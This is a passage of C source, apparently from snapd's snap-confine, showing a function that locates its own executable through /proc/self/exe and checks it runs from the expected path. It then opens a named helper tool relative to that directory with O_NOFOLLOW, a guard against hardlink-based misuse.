   167	static int sc_open_snapd_tool(const char *tool_name) {
   168	    // +1 is for the case where the link is exactly PATH_MAX long but we also
   169	    // want to store the terminating '\0'. The readlink system call doesn't add
   170	    // terminating null, but our initialization of buf handles this for us.
   171	    char buf[PATH_MAX + 1] = {0};
   172	    if (readlink("/proc/self/exe", buf, sizeof(buf) - 1) < 0) {
   173	        die("cannot readlink /proc/self/exe");
   174	    }
   175	    if (buf[0] != '/') {  // this shouldn't happen, but make sure have absolute path
   176	        die("readlink /proc/self/exe returned relative path");
   177	    }
   178	    // as we are looking up other tools relative to our own path, check
   179	    // we are located where we think we should be - otherwise we
   180	    // may have been hardlink'd elsewhere and then may execute the
   181	    // wrong tool as a result
   182	    if (!sc_is_expected_path(buf)) {
   183	        die("running from unexpected location: %s", buf);
   184	    }
   185	    char *dir_name = dirname(buf);
   186	    int dir_fd SC_CLEANUP(sc_cleanup_close) = -1;
   187	    dir_fd = open(dir_name, O_PATH | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC);
   188	    if (dir_fd < 0) {
   189	        die("cannot open path %s", dir_name);
   190	    }
   191	    int tool_fd = -1;
   192	    tool_fd = openat(dir_fd, tool_name, O_PATH | O_NOFOLLOW | O_CLOEXEC);
   193	    if (tool_fd < 0) {
   194	        die("cannot open path %s/%s", dir_name, tool_name);
   195	    }
   196	    debug("opened %s executable as file descriptor %d", tool_name, tool_fd);
   197	    return tool_fd;
